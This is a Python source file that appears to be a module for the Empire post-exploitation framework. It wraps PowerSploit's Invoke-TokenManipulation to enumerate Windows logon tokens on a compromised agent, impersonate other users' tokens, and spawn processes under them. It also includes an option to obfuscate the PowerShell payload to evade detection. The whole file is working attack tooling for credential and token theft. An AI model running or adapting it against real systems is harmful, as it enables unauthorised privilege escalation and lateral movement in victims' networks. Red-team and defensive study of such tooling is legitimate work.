import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-TokenManipulation',

            'Author': ['@JosephBialek'],

            'Description': ("Runs PowerSploit's Invoke-TokenManipulation to "
                            "enumerate Logon Tokens available and uses "
                            "them to create new processes. Similar to "
                            "Incognito's functionality. Note: if you select "
                            "ImpersonateUser or CreateProcess, you must specify "
                            "one of Username, ProcessID, Process, or ThreadId."),

            'Background' : False,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RevToSelf' : {
                'Description'   :   'Switch. Revert to original token.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ShowAll' : {
                'Description'   :   'Switch. Enumerate all tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ImpersonateUser' : {
                'Description'   :   'Switch. Will impersonate an alternate users logon token in the PowerShell thread.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'CreateProcess' : {
                'Description'   :   'Specify a process to create instead of impersonating the user.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WhoAmI' : {
                'Description'   :   'Switch. Displays current credentials.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Username' : {
                'Description'   :   'Username to impersonate token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcessID' : {
                'Description'   :   'ProcessID to impersonate token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Process' : {
                'Description'   :   'Process name to impersonate token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ThreadId' : {
                'Description'   :   'Thread to impersonate token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcessArgs' : {
                'Description'   :   'Arguments for a spawned process.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NoUI' : {
                'Description'   :   'Switch. Use if creating a process which doesn\'t need a UI.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-TokenManipulation.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-TokenManipulation.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "Invoke-TokenManipulation"

        if self.options['RevToSelf']['Value'].lower() == "true":
            script += " -RevToSelf"
        elif self.options['WhoAmI']['Value'].lower() == "true":
            script += " -WhoAmI"
        elif self.options['ShowAll']['Value'].lower() == "true":
            script += " -ShowAll | Out-String"
        else:

            for option,values in self.options.iteritems():
                if option.lower() != "agent":
                    if values['Value'] and values['Value'] != '':
                        if values['Value'].lower() == "true":
                            # if we're just adding a switch
                            script += " -" + str(option)
                        else:
                            script += " -" + str(option) + " " + str(values['Value'])

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith("-ShowAll"):
                script += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String"
            else:
                script += "| Out-String"
                if self.options['RevToSelf']['Value'].lower() != "true":
                    script += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-TokenManipulation.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-TokenManipulation.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-TokenManipulation.ps1"
        return os.path.isfile(obfuscatedSource)
